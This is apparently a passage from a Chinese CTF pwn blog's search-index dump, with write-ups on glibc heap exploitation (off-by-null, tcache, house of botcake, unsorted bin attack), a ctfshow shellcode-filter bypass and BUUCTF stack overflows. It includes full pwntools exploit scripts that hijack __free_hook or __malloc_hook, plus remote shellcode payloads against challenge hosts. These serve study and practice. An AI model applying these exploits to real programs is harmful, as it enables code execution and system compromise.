b&#x27;\\x00&#x27;))\n\n这里就只解释一下为什么是show(0),因为将堆块0，1都free了，所以先申请的0x18的堆块变成了堆块0，后申请的0x200的是堆块1\n2.off by null fastbin attack 打malloc因为我们将堆块0，又申请出来了，导致堆块1是free状态，可以打印，但无法修改，所以没发改fd，进行fastbin attach\n所以我们再多申请一个，使得四个堆块堆叠，堆块1泄露libc，用堆块2改fd进行fastbin attach\nadd(0x100 , b&#x27;chunk0&#x27;)add(0x100 , b&#x27;chun1&#x27;) add(0x68 , b&#x27;chunk2&#x27;) add(0xf0 , b&#x27;chunk3&#x27;) add(0x10 , b&#x27;chunk4&#x27;) payload = p64(0) * 12+ p64(0x290)edit(2 , payload)free(0)free(3)add(0x100 , b&#x27;chunk0&#x27;) show(1)fd =u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))log.success(&#x27;fd = &#x27;+hex(fd))pause()libc_base = fd - 0x3c4b78malloc_hook=libc_base+libc.sym[&#x27;__malloc_hook&#x27;]fake_chunk_addr=malloc_hook-0x23log.success(&#x27;fake_chunk_addr = &#x27;+hex(fake_chunk_addr))free(2)add(0x120, b&#x27;\\0&#x27;*0x108+flat(0x71, fake_chunk_addr))bug()one_gadget=libc_base+0x4527arealloc_addr=libc_base+libc.sym[&#x27;__libc_realloc&#x27;]add(0x68,b&#x27;aaaa&#x27;)payload=b&#x27;a&#x27;*(0x13-0x08)+p64(one_gadget)+p64(realloc_addr+12)add(0x68,payload)p.sendline(b&#x27;1&#x27;)p.recvuntil(b&quot;How much do you want&quot;)p.sendline(b&#x27;0x18&#x27;)#bug()p.interactive()\n\nfree(2)\nadd(0x120, b’\\0’*0x108+flat(0x71, fake_chunk_addr))\n将堆块2free，申请处0x120，将堆块2的fd改了，fastbin attack\n在这里就解释一下这个\n为什么不能直接修改chunk2，因为堆块已经合并了，即使修改修改完fd也申请不出来，只能将chunk2前一个堆块先申请出来，多申请一点，带着把chunk2的fd给修改了\n3.off by null fastbin attack unlinkadd(0x80,b’chunk0’)\nadd(0x68,b’chunk1’)\nadd(0xf0,b’chunk2’)\nadd(0x10,b’chunk3’)\nbug()\nfree(0)\npayload &#x3D; b’\\x00’*0x60+p64(0x100)\nedit(1,payload)\nfree(2)\n这个与前面的一样就不解释了\n然后最关键的来了\nfree(1)（堆块1其实被free了两次）\nadd(0xa0, b’\\0’*0x88+flat(0x71, 0x6020a0-3))（堆叠改，也可以double free具体实现看下面代码）\n这个就是fastbin attack，为什么选在0x6020a0-3，因为fastbin可以申请在这里，而且距离堆块指针所在的地址近\n看一下gdb就明白了\n\nfastbin可以申请在这里\n\n并且距离指针所在地址近，往下面覆盖可以更改指针指向的地址，也就是指针的值，就行unlink一样\nadd(0x68,b’\\n’)\nadd(0x68, b’\\0’*3 + flat(0,0,0,0, elf.got[‘atoi’], elf.got[‘puts’]))\n再来理解一下这个，申请两次就把0x6020a0-3这个位置申请出来了，然后因为chunk头，我们其实是从0x6020b0-3这个位置开始写的，先写三个0对齐\n然后看gdb吧\n\n补充p64(0)*4\n然后再写就写到0x6020d0，与0x6020d8，也就是将chunk2，chunk3，指针所指向的地址改成了\nelf.got[‘atoi’], elf.got[‘puts’]\n\n\n然受show（3）泄露libc，修改堆块2，将atoi got表改成system\n4.off by null 实现double freeadd(0x80) #0add(0x68) #1add(0x1f0) #2add(0x18) #3free(0) edit(1,p64(0)*12+p64(0x100))free(2) #为了造成1uaf，1被free了但是指针位清零add(0x80) #1add(0x68) #2free(1)edit(2,p64(0x60209d))add(0x68)add(0x68)\n\n二、2.271.off by null因为2.27的Tcachebins  没有检查，可以任意地址申请，所以我们直接打__free_hook就行\nfrom pwn import *context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)libc = ELF(&#x27;/home/he/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;)p = process(&#x27;./pwn&#x27;)elf = ELF(&#x27;./pwn&#x27;)def bug():    gdb.attach(p)def add(idx,size):    p.recvuntil(&#x27;:&#x27;)    p.sendline(b&#x27;1&#x27;)    p.recvuntil(b&#x27;Index:&#x27;)    p.sendline(str(idx))    p.recvuntil(b&#x27;Size&#x27;)    p.sendline(str(size))def free(idx):    p.recvuntil(&#x27;:&#x27;)    p.sendline(b&#x27;4&#x27;)    p.recvuntil(b&#x27;Index:&#x27;)    p.sendline(str(idx))def show(idx):    p.recvuntil(&#x27;:&#x27;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(b&#x27;Index:&#x27;)    p.sendline(str(idx))def edit(idx,content):    p.recvuntil(&#x27;:&#x27;)    p.sendline(b&#x27;2&#x27;)    p.recvuntil(b&#x27;Index:&#x27;)    p.sendline(str(idx))    p.recvuntil(b&#x27;Content:&#x27;)    p.sendline(content)for i in range (7):    add(i,0xf0)add(7,0xf0)add(8,0x88)add(9,0xf0)add(10,0x10)for i in range(8):    free(i)payload = b&#x27;\\x00&#x27;*0x80+p64(0x190)edit(8,payload)free(9)for i in range(7):    add(i, 0xf0)add(7, 0xf0)show(8)libc_base = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))-0x3ebca0log.success(&#x27;libc_base--&gt;&#x27;+hex(libc_base))free_hook=libc_base+libc.sym[&#x27;__free_hook&#x27;]add(11,0x88)free(11)edit(8,p64(free_hook))add(12,0x88)add(13,0x88)system = libc.sym[&#x27;system&#x27;]+libc_baseedit(13,p64(system))edit(12,b&#x27;/bin/sh\\x00&#x27;)free(12)p.interactive()\n\nfor i in range (7):\n​    add(i,0xf0)\nadd(7,0xf0)\n先申请七个，在申请的这个就会进入unsortbins，用来泄露libc\nadd(8,0x88)\n这个堆块是在Tcachebins  中，但是也可以堆块合并堆叠，并且利用比fastbins更简单\nfor i in range(7):\n​    add(i, 0xf0)\nadd(7, 0xf0)\n这个先将7个Tcachebin申请出来，在申请一个就是unsortbins的，这样就可以泄露libc了，后面就不解释了\n","categories":["堆"],"tags":["知识点"]},{"title":"shellcode（ctfshow66）","url":"/2025/02/01/shellcode3/","content":"ctfshow66Arch:       amd64-64-little  RELRO:      Partial RELRO  Stack:      No canary found  NX:         NX enabled  PIE:        No PIE (0x400000)  Stripped:   No\n\n64位，NX栈不可执行开启\nida:\nint __fastcall main(int argc, const char **argv, const char **envp)&#123;  void *buf; // [rsp+8h] [rbp-8h]  init(argc, argv, envp);  logo();  buf = mmap(0LL, 0x1000uLL, 7, 34, 0, 0LL);  puts(&quot;Your shellcode is :&quot;);  read(0, buf, 0x200uLL);  if ( !(unsigned int)check(buf) )  &#123;    printf(&quot; ERROR !&quot;);    exit(0);  &#125;  ((void (__fastcall *)(void *))buf)(buf);  return 0;&#125;\n\n这道题与前面ctfshow64差不多。多了一个检查\ncheck：\n__int64 __fastcall check(_BYTE *a1)&#123;  _BYTE *i; // [rsp+18h] [rbp-10h]  while ( *a1 )  &#123;    for ( i = &amp;unk_400F20; *i &amp;&amp; *i != *a1; ++i )      ;    if ( !*i )      return 0LL;    ++a1;  &#125;  return 1LL;&#125;\n\n意思检查数据是与unk_400F20里面的相同，相同返回1（假），不同返回0（真）\n在经过if判断检查是否通过\n检查失败情况：当 check 函数返回 0 时，(unsigned int)check(buf) 的结果为 0，再经过逻辑非运算 !(unsigned int)check(buf) 的结果为 1。此时 if 条件判断为真，程序会执行 if 语句块内的代码，先通过 printf(&quot; ERROR !&quot;); 输出错误信息 &quot; ERROR !&quot;，然后调用 exit(0) 终止程序。exit(0) 一般表示程序正常退出，但在这里实际上是因为输入的 buf 不符合检查要求而提前终止程序。\n检查通过情况：当 check 函数返回 1 时，(unsigned int)check(buf) 的结果为 1，经过逻辑非运算 !(unsigned int)check(buf) 的结果为 0。此时 if 条件判断为假，程序不会执行 if 语句块内的代码，而是继续执行后续的代码，也就是执行 ((void (__fastcall *)(void *))buf)(buf); 这行代码来执行用户输入的 shellcode。\n我们看一下unk_400F20里面的数据\n.rodata:0000000000400F20 unk_400F20      db  5Ah ; Z             ; DATA XREF: check+8↑o.rodata:0000000000400F21                 db  5Ah ; Z.rodata:0000000000400F22                 db  4Ah ; J.rodata:0000000000400F23                 db  20h.rodata:0000000000400F24                 db  6Ch ; l.rodata:0000000000400F25                 db  6Fh ; o.rodata:0000000000400F26                 db  76h ; v.rodata:0000000000400F27                 db  65h ; e.rodata:0000000000400F28                 db  73h ; s.rodata:0000000000400F29                 db  20h.rodata:0000000000400F2A                 db  73h ; s.rodata:0000000000400F2B                 db  68h ; h.rodata:0000000000400F2C                 db  65h ; e.rodata:0000000000400F2D                 db  6Ch ; l.rodata:0000000000400F2E                 db  6Ch ; l.rodata:0000000000400F2F                 db  5Fh ; _.rodata:0000000000400F30                 db  63h ; c.rodata:0000000000400F31                 db  6Fh ; o.rodata:0000000000400F32                 db  64h ; d.rodata:0000000000400F33                 db  65h ; e.rodata:0000000000400F34                 db  2Ch ; ,.rodata:0000000000400F35                 db  61h ; a.rodata:0000000000400F36                 db  6Eh ; n.rodata:0000000000400F37                 db  64h ; d.rodata:0000000000400F38                 db  20h.rodata:0000000000400F39                 db  68h ; h.rodata:0000000000400F3A                 db  65h ; e.rodata:0000000000400F3B                 db  72h ; r.rodata:0000000000400F3C                 db  65h ; e.rodata:0000000000400F3D                 db  20h.rodata:0000000000400F3E                 db  69h ; i.rodata:0000000000400F3F                 db  73h ; s.rodata:0000000000400F40                 db  20h.rodata:0000000000400F41                 db  61h ; a.rodata:0000000000400F42                 db  20h.rodata:0000000000400F43                 db  67h ; g.rodata:0000000000400F44                 db  69h ; i.rodata:0000000000400F45                 db  66h ; f.rodata:0000000000400F46                 db  74h ; t.rodata:0000000000400F47                 db  3Ah ; :.rodata:0000000000400F48                 db  0Fh.rodata:0000000000400F49                 db    5.rodata:0000000000400F4A                 db  20h.rodata:0000000000400F4B                 db  65h ; e.rodata:0000000000400F4C                 db  6Eh ; n.rodata:0000000000400F4D                 db  6Ah ; j.rodata:0000000000400F4E                 db  6Fh ; o.rodata:0000000000400F4F                 db  79h ; y.rodata:0000000000400F50                 db  20h.rodata:0000000000400F51                 db  69h ; i.rodata:0000000000400F52                 db  74h ; t.rodata:0000000000400F53                 db  21h ; !\n\n发现为可见字符串\n绕过if：\n1.我们可以用可见字符串写shellcode\n2.绕过 while(*a)，当它遇到\\x00就不检验了，我们可以使shellcode以\\x00开头\n利用脚本找\\x00开头的汇编代码\nfrom pwn import *from itertools import *import re for i in range(1, 3):    for j in product([p8(k) for k in range(256)], repeat=i):        payload = b&quot;\\x00&quot; + b&quot;&quot;.join(j)        res = disasm(payload)        if (            res != &quot;        ...&quot;            and not re.search(r&quot;\\[\\w*?\\]&quot;, res)            and &quot;.byte&quot; not in res        ):            print(res)            input()\n\n\n找到了一个’\\x00\\xc0’\nexp:\nfrom pwn import*context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28156)shellcode = asm(shellcraft.sh())payload = b&#x27;\\x00\\xc0&#x27;+shellcodeio.sendline(payload)io.interactive()\n\n","categories":["第三周"],"tags":["wp"]},{"title":"tcache attack","url":"/2025/11/18/tcache-attack/","content":"\ntcache介绍\n1.每个线程默认使用64个单链表结构的bins，每个bins最多存放7个chunk，64位机器16字节递增，从0x20到0x410，也就是说位于以上大小的chunk释放后都会先行存入到tcache bin中，当申请大于7个就会放入fastbins，但是tcache优先级高于fastbins，tcache先被申请出来\n2.对于每个tcache bin单链表，它和fast bin一样都是先进后出，而且prev_inuse标记位都不会被清除，所以tcache bin中的chunk不会被合并，即使和Top chunk相邻。\ntcache机制出现后，每次产生堆都会先产生一个0x250大小的堆块，该堆块位于堆的开头，用于记录64个bins的地址（这些地址指向用户数据部分）以及每个bins中chunk数量。在这个0x250大小的堆块中，前0x40个字节用于记录每个bins中chunk数量，每个字节对应一条tcache bin链的数量，从0x20开始到0x410结束，刚好64条链，然后剩下的每8字节记录一条tcache bin链的开头地址，也是从0x20开始到0x410结束。还有一点值得注意的是，tcache bin中的fd指针是指向malloc返回的地址，也就是用户数据部分，而不是像fast bin单链表那样fd指针指向chunk头。\n\n\ntcache绕过1.绕过tcache进行fastbin attack申请大小相同的七个堆块，然后在申请一个，free7个，free最后申请的那个就会进入fastbin\n2.绕过tcache bin ，利用unsorted bin，申请大于0x400的堆块，要防止堆块和top chunk合并\n3.使用calloccalloc函数不会分配tcache bin中的堆块，因此如果题目中出现了calloc函数，我们可以想到利用该函数直接绕过tcache，从而获得其它bin上的chunk。\n申请8个free8个使用calloc申请就会直接获取ast bin上的chunk块（正常是先会申请tcache上的）\ntcache extend1.tcache机制情况下的chunk extend，相比较于fastbin，tcache机制的加入使得漏洞利用更简单，因此实现chunk extend也更轻松，不用正确标记next chunk的size,只需要修改当前chunk的size。我们free再malloc后就可以获得对应大小的chunk\n2.glibc-2.27版本引入了tcache，但此时还没引入tcache的检测，所以基本就是想怎么申请都行,直接利用use aftr free，修改fd为__malloc&#x2F;free_hook\n3.glibc-2.31版本引入了tcache长度保护，会检测bins上的个数是否和申请的匹配，不匹配的话没法申请出来。比如说tcache_bins上0x90的chunk个数为0，但是我们gdb里显示我们劫持的地址还没申请出来，这个时候如果malloc的话是无效的，没法申请出来。所以要是想劫持hook地址，我们就需要至少两个堆块被free进了tcache_bins里，修改头指针fd为hook即可\n1.tcachebin uaf1.glibc-2.27的tcachebin改fd指针申请堆块不会检查，所以可以随便改（也就是打malloc&#x2F;free不用找size位为0x7f的了），这使得打free_hook,更简单\n2..glibc-2.31版本引入了tcache长度保护，会检测bins上的个数是否和申请的匹配，比如说tcache_bins上0x90的chunk个数为0，但是我们gdb里显示我们劫持的地址还没申请出来，这个时候如果malloc的话是无效的，没法申请出来。所以要是想劫持hook地址，我们就需要至少两个堆块被free进了tcache_bins里，修改最后被free的那个堆块的fd指针\nfor i in range(8):    add(i,0x80)bug()add(8,0x10)for i in range(8):    free(i)bug()show(7)libc_base = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))-0x3ebca0log.success(&#x27;libc_base--&gt;&#x27;+hex(libc_base))__free_hook = libc_base+libc.sym[&#x27;__free_hook&#x27;]edit(6,p64(__free_hook))bug()add(9,0x80)edit(9,b&#x27;/bin/sh\\x00&#x27;)add(10,0x80)system = libc_base +libc.sym[&#x27;system&#x27;]edit(10,p64(system))free(9)\n\n先申请7个，在申请一个就会在unsortbin，利用这个泄露libc，修改最后一个tcachebin的fd，申请两次就把free_hook申请出来了\n2.tcachebin off by nullfor i in range (7):    add(i,0xf0)add(7,0xf0)add(8,0x88)add(9,0xf0)add(10,0x10)for i in range(8):    free(i)payload = b&#x27;\\x00&#x27;*0x80+p64(0x190)edit(8,payload)free(9)for i in range(7):    add(i, 0xf0)add(7, 0xf0)show(8)libc_base = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))-0x3ebca0log.success(&#x27;libc_base--&gt;&#x27;+hex(libc_base))free_hook=libc_base+libc.sym[&#x27;__free_hook&#x27;]add(11,0x88)free(11)bug()edit(8,p64(free_hook))add(12,0x88)add(13,0x88)system = libc.sym[&#x27;system&#x27;]+libc_baseedit(13,p64(system))edit(12,b&#x27;/bin/sh\\x00&#x27;)free(12)\n\n\n\n具体就是绕过tcachebin，将堆块申请在unsortbin就行具体就不解释了，和正常的off by null一样\n3.tcachebin off by one让合并后的堆块大于0x400，进入unsortbin就可以\nd(0x18, &#x27;aaaa&#x27;) #0add(0x68, &#x27;aaaa&#x27;) #1add(0x68, &#x27;aaaa&#x27;) #2add(0x10, &#x27;aaaa&#x27;) #3payload = &#x27;a&#x27;*0x18 + &#x27;\\xe1&#x27;  edit(0, payload) delete(1)           add(0x60, &#x27;aaaa&#x27;)  show(2）add(0x68,b&#x27;\\x00&#x27;*8)free(4)edit(2,p64(fake_chunk_addr))\n\n4.tcache stashing unlink attack知识点：\n1.当系统需要分配内存，且 tcache bin 和 fastbin 中都找不到合适的堆块时，就会到 unsorted bin 上寻找。如果申请的内存堆块小于 unsorted bin 中某个堆块的大小，那么会将该内存块切割后返回给用户，剩下的部分仍然保存在 unsorted bin 上；如果申请的内存堆块大于 unsorted bin 上存放的堆块大小，那么会从 Top chunk 上重新分割，此时就会把 unsorted bin 上的堆块按照大小放回 small bin 和 large bin 中。\n2.当从smallbin中申请出来一个堆块，smallbin剩余的堆块就会被挂进tcachebin，并且只会检查第一个被挂进tcachebin的堆块\n利用前提：有calloc\n首先申请9个堆块，先释放3-8，再将堆块1，释放，最后释放0，2\n\n解释：这样目的是为了后面申请0xb0的堆块，tcache bin 和 fastbin 中都找不到合适的堆块，且unsortbins也不能合并（因为不相邻），这样最后会从top_chunk中新申请一个0xb0(data部分为0xa0)大小的堆块，并且将unsorted bin中的两个堆块，按照大小排列在small bin中：\n\n然后在申请两个0xa0的堆块，将tcache bin空出来\n\n\n将2的bk改为任意地址，然后用calloc申请堆块，堆块0就会被申请出来，堆块2，与伪造堆块2后面的堆块就会被放入tcache bin\n\n5.高版本没有edit  tcachebin attackglibc2.29～glibc2.39，tcache加入了 key 值来进行 double free 检测，以至于在旧版本时的直接进行 double free 变的无效，所以自然就有了绕过方法，绕过方法其中比较典型的就是 house of botcake，他的本质也是通过 UAF 来达到绕过的目的\n当 free 掉一个堆块进入 tcache 时，假如堆块的 bk 位存放的 key == tcache_key ， 就会遍历这个大小的 Tcache ，假如发现同地址的堆块，则触发 Double Free 报错。\n从攻击者的角度来说，我们如果想继续利用 Tcache Double Free 的话，一般可以采取以下的方法：\n之前只是检查链表的上一个，这次是检查全部的链表\n从攻击者的角度来说，我们如果想继续利用 Tcache Double Free 的话，一般可以采取以下的方法：\n\n破坏掉被 free 的堆块中的 key，绕过检查（常用）\n改变被 free 的堆块的大小，遍历时进入另一 idx 的 entries\nHouse of botcake（常用没有edit）\n\n1.free后用uaf改bk，然后就可以再次free\n2没学\n3.House of botcacke 合理利用了 Tcache 和 Unsortedbin 的机制，同一堆块第一次 Free 进 Unsortedbin 避免了 key 的产生，第二次 Free 进入 Tcache，让高版本的 Tcache Double Free 再次成为可能。\nfor i in range(7):   add(i,0x100,b&#x27;aaaa&#x27;)add(7,0x100,b&#x27;aaaa&#x27;)add(8,0x100,b&#x27;aaaa&#x27;)add(9,0x10,b&#x27;/bin/sh\\x00&#x27;)for i in range(7):   free(i)   free(8)show(8)libc_base = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))-0x1ebbe0print(hex(libc_base))free(7)add(10,0x100,b&#x27;aaaa&#x27;)system = libc_base +libc.sym[&#x27;system&#x27;]free(8)free_hook=libc_base+libc.sym[&#x27;__free_hook&#x27;]payload = b&#x27;a&#x27;*0xf0+p64(0)*3+p64(0x101)+p64(free_hook)add(11,0x150,payload)add(12,0x100,b&#x27;aaaa&#x27;)add(13,0x100,p64(system))free(9)for i in range(7):   add(i,0x100,b&#x27;aaaa&#x27;)add(7,0x100,b&#x27;aaaa&#x27;)add(8,0x100,b&#x27;aaaa&#x27;)add(9,0x10,b&#x27;/bin/sh\\x00&#x27;)for i in range(7):   free(i) free(8)\n\n堆块8进入unsortbin\nfree(7)\n\n堆块8与堆块7合并\nmalloc(0x100)\n\ntcachebin中就空出来一个\n然后再次\nfree(8)\n\n这时8被free两次，一次在unsortbin中，另一次在tcachebin中，而且形成堆叠，8在7这个合并的大堆块中\nadd(11,0x150,payload)\n\n申请一个大堆块，改堆块8的fd\ntcachebin attack\n提问：为什么不能先free(7)后free(8)\n因为后面double free free(7),unsortbin链表就被破坏了\n\nfor i in range(7):   add(i,0x100,b&#x27;aaaa&#x27;)add(7,0x100,b&#x27;aaaa&#x27;)add(8,0x100,b&#x27;aaaa&#x27;)add(9,0x10,b&#x27;/bin/sh\\x00&#x27;)for i in range(7):   free(i)   free(7)show(7)libc_base = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))-0x1ebbe0print(hex(libc_base))free(8)bug()add(10,0x210,b&#x27;\\x10&#x27;)add(11,0x100,b&#x27;/bin/sh\\x00&#x27;)free(8)free(10)add(12,0x210,b&#x27;a&#x27;*0x110+p64(fd))for i in range(7):   add(i,0x100,b&#x27;aaaa&#x27;)add(7,0x100,b&#x27;aaaa&#x27;)add(8,0x100,b&#x27;aaaa&#x27;)add(9,0x10,b&#x27;/bin/sh\\x00&#x27;)for i in range(7):   free(i)free(7)free(8)\n\n7,8堆块合并进入unsortbin\nadd(10,0x210,b&#x27;\\x10&#x27;)\n\n将他两个申请出来，但是有uaf，所以7堆块和10堆块的指针指向同一块地址\nadd(11,0x100,b&#x27;/bin/sh\\x00&#x27;)\n\n将tachebin空出来一个\nfree(8)\n\n进入tachebin\nfree(10)add(12,0x210,b&#x27;a&#x27;*0x120)\n\nfree10，又将10申请出来，12就可以覆盖到8\n5.高版本glibc的tcache和fastbin指针加密机制高版本tcachebin有加密机制，当free后堆块地址会加密，我们改fd指针，他会解密，然后就错了，所以我们先按照他的方法加密，写进去他解密就是对的\n加密：原来指针^加密指针&gt;&gt;12\nheap &#x3D; u64(p.recv(5).ljust(8, b’\\x00’))&lt;&lt;12\nfd&#x3D;(fd)^(heap)&gt;&gt;12\n","categories":["堆"],"tags":["知识点"]},{"title":"unsortbin attack","url":"/2025/11/18/unsortbin-attack/","content":"\n作用：\nUnsorted Bin Attack从字面上就可以看出，正合适一种针对Unsorted Bin机制的攻击手法。这种攻击手法实现的前提是能够控制挂进unsorted bin中的chunk的bk指针，在控制bk指针的情况下可以实现修改任意地址值为一个较大的数值。没错就是较大的数，这个数是不可控的，所以我是真的没有想明白这个攻击手法除了CTF之外还有什么实际的用处😂\nUnsorted bin中chunk的主要来源\n1.当一个较大的chunk被分割成两部分后，如果剩下的部分大于MINSIZE，则会被放进Unsorted bin中\n2.释放一个不属于fast bin的chunk，并且该chunk不与top chunk相邻，该 chunk会被首先放到Unsorted bin中\n3.当进行malloc_consolidate（块合并）时，如果合并后的chunk不与top chunk相邻，则可能会把合并后的chunk放到Unsorted bin中\n基本使用情况\nUnsorted Bin在使用过程中，采用的遍历顺序是FIFO（先进先出），即挂进链表的时候依次从Unsorted bin的头部向尾部挂，取的时候是从尾部向头部取\n在程序malloc时，如果fast bin、small bin中找不到对应大小的chunk，就会尝试从Unsorted bin中寻找chunk。如果取出来的chunk的size刚好满足，则直接交给用户，否则就会把这些chunk分别插入到对应的bin中\n\n申请两个堆块，第一个小一点方便溢出，第二个一定要在unsortbin，释放第二个堆块，利用uaf或者堆溢出漏洞，将第二个堆块的bk指针改为要改数据的地址-0x10，这样在第二个堆块后面就伪造了一个被free的堆块（这个堆块fd指针的地址刚好就是要改数据的地址），当第二个堆块被申请走，fd指针指向main_arena-88，也就被改为了一个很大的值（其实就是main_arena-88）\n","categories":["堆"],"tags":["知识点"]},{"title":"BUUCTF wp","url":"/2025/01/19/wp/","content":"1.[NISACTF 2022]ReorPwn?\n用ida打开发现gets危险函数但是没有栈溢出，在调用system函数前，调用了fun函数\n看一下fun函数没看懂搜了一下，是交换字符串的位置反转一下，输入sl没有反应，直接输入galf tac，flag出来了\n\n2.[BJDCTF 2020]babystack2.0Checksec发现64位nx保护开启\n\n从题目提示看是整数溢出和栈溢出\n用idea打开发现后门函数backdoor（0x0400726）和危险函数read可以栈溢出（0x10），但是被if函数限制了得绕过if函数\n\n搜了一下wp\n\n看懂了，本来nbytes是无符号的整型（size_t），而后面转换成了有符号的整型（int）发送-1，10绕过if，且unsigned int是无符号整型，遇到-1就会变成unsigned int的最大值，使read函数能够栈溢出最后返回到后门的地址。\nexp\nfrom pwn import*r = remote(&#x27;node4.anna.nssctf.cn&#x27;,28220)p1 = b&#x27;-1&#x27;r.sendline(p1)p2 = b&#x27;a&#x27;*(0x10+0x8)+p64(0x0400726)r.sendline(p2)r.interactive()\n\n3.[BJDCTF 2020]babystack\n这道题与上一道相似，但是少了if，更简单了，buf读入的数据长度由我们输入的nbytes来决定，这里可以栈溢出，先输入一个大于0x10字节，在进行溢出就可以。\nExp\nfrom pwn import*r = remote(&#x27; [node4.anna.nssctf.cn’,28343](http://node4.anna.nssctf.cn:28343/)&#x27;)p1 = b&#x27;100&#x27;r.sendline(p1)p2 = b&#x27;a&#x27;*(0x10+0x8)+p64(0x04006E6)r.sendline(p2)r.interactive()\n\n也可以用上面一个exp因为unsigned int是无符号整型，遇到-1就会变成unsigned int的最大值\n4.[NISACTF 2022]ezstackChecksec发现是32位的。NX保护开启\nIda分析发现main函数，又发现shell函数发现read可以栈溢出，shift+f12发现system与&#x2F;bin&#x2F;sh，找到system的地址，与&#x2F;bin&#x2F;sh的地址编写exp\nfrom pwn import *p = remote(&#x27;node5.anna.nssctf.cn&#x27;, 22397)sh_addr=0x804a024system_plt=0x8048390payload=b&#x27;a&#x27;*(0x48+0x4)+p32(system_plt)+p32(sh_addr)+p32(sh_addr)                #第一个p32(sh_addr)用于占位p.sendline(payload)p.interactive()\n\n5.[GFCTF 2021]where_is_shellChecksec发现保护开启，ida查看发现危险函数read，可以栈溢出，有system函数无&#x2F;bin&#x2F;sh，不会写，看了一下wp，虽然没有&#x2F;bin&#x2F;sh字符串，但是的汇编二进制代码里的24 30可以用来表示$0，而$0指代的就是”&#x2F;bin&#x2F;sh，\n&#x2F;bin&#x2F;sh的地址为\n \npop rdi；ret地址\n \n还需要栈对齐需要\n \nExp模板\nfrom pwn import*p = remote（）payload = b&#x27;a&#x27;*(0x10 + 8) + p64(ret_addr) + p64(pop_rdi_addr) + p64(sh_addr) + p64(sys_addr)p.sendline(payload)p.interactive()\n\n \n6.[NSSCTF 2022 Spring Recruit]R3m4ke?checksec查看\nIda打开，发现危险函数gets栈溢出\n有&#x2F;bin&#x2F;sh字符串非常简单的栈溢出\n找到system的地址栈溢出返回到system地址\n \nExp\n \n7.[HNCTF 2022 Week1]easyoverflowChecksec\n \nIda打开发现gets危险函数，可以溢出，发现cat flag字符串可以作为返回地址\n地址：\nExp\n \n8.[WUSTCTF 2020]getshellChecksec\n \nIda\n发现\n可以栈溢出，发现&#x2F;bin&#x2F;sh字符串，地址\nExp\n \n9.[GDOUCTF 2023]EASY PWNIda分析发现是随机生成一个数字，猜数字\n发现gets函数，可以栈溢出\nShift+f12发现后门flag.txt \n找到地址0x0011D5 \n直接溢出\nExp如下\n \n10.others_shellcode checksec查看\n\nIda查看\n没有看懂\nNc一下\n\n直接出来了，非常神奇\n搜了一下wp\n\n","categories":["第一周"],"tags":["wp"]},{"title":"unsortbins","url":"/2025/11/18/unsortbins/","content":"\n以下是关于 unsorted bin 的 bin头 的 fd 和 bk 指向的详细解释和结构图，涵盖不同链表情形：\n\n1. 基础规则在 glibc 的堆管理中：\n\nunsorted bin 是双向循环链表，遵循 FIFO（先进先出）规则。\nbin头 的 fd：指向链表的第一个 chunk（最靠近头部的 chunk）。\nbin头 的 bk：指向链表的最后一个 chunk（最靠近尾部的 chunk）。\n空链表时：fd 和 bk 均指向 bin头 自身。\n\n\n2. 不同链表情形的结构图(1) 空链表当 unsorted bin 为空时，fd 和 bk 均指向自身：\n+-------------------+|      bin头        || fd = &amp;bin头       || bk = &amp;bin头       |+-------------------+\n\n(2) 单个 chunk（chunk1）插入一个 chunk 后，链表形成循环：\n+-------------------+       +-------------------+|      bin头        | &lt;---&gt; |      chunk1       || fd = chunk1       |       | fd = &amp;bin头        || bk = chunk1       |       | bk = &amp;bin头        |+-------------------+       +-------------------+\n\n\n逻辑：bin头 的 fd 和 bk 均指向 chunk1，chunk1 的 fd 和 bk 回指 bin头。\n\n(3) 两个 chunk（chunk1 和 chunk2）插入第二个 chunk 到链表头部后：\n+-------------------+       +-------------------+       +-------------------+|      bin头        | &lt;---&gt; |      chunk2       | &lt;---&gt; |      chunk1       || fd = chunk2       |       | fd = chunk1       |       | fd = &amp;bin头        || bk = chunk1       |       | bk = &amp;bin头        |       | bk = chunk2       |+-------------------+       +-------------------+       +-------------------+\n\n\n关键指针：\n\nbin头.fd 指向第一个 chunk（chunk2）。\n\nbin头.bk 指向最后一个 chunk（chunk1）。\n\nchunk2.fd 指向 chunk1，chunk2.bk 指向 bin头。\n\nchunk1.fd 指向 bin头，chunk1.bk 指向 chunk2。\n\n\n(4) 三个 chunk（chunk1、chunk2、chunk3）插入第三个 chunk 到链表头部后：\n+-------------------+       +-------------------+       +-------------------+       +-------------------+|      bin头        | &lt;---&gt; |      chunk3       | &lt;---&gt; |      chunk2       | &lt;---&gt; |      chunk1       || fd = chunk3       |       | fd = chunk2       |       | fd = chunk1       |       | fd = &amp;bin头        || bk = chunk1       |       | bk = &amp;bin头        |       | bk = chunk3       |       | bk = chunk2       |+-------------------+       +-------------------+       +-------------------+       +-------------------+\n\n\n逻辑：新 chunk 插入链表头部，bin头.bk 始终指向尾部 chunk（chunk1）。\n\n\n3. 动态操作示例(1) 插入新 chunk向空链表插入 chunk1：\n[初始] 空链表：bin头.fd = &amp;bin头bin头.bk = &amp;bin头[插入 chunk1]：bin头.fd = chunk1bin头.bk = chunk1chunk1.fd = &amp;bin头chunk1.bk = &amp;bin头\n\n(2) 从链表中移除 chunk从两个 chunk 的链表中移除 chunk1：\n[移除前]：bin头.fd = chunk2bin头.bk = chunk1chunk2.fd = chunk1chunk2.bk = &amp;bin头chunk1.fd = &amp;bin头chunk1.bk = chunk2[移除 chunk1 后]：+-------------------+       +-------------------+|      bin头        | &lt;---&gt; |      chunk2       || fd = chunk2       |       | fd = &amp;bin头        || bk = chunk2       |       | bk = &amp;bin头        |+-------------------+       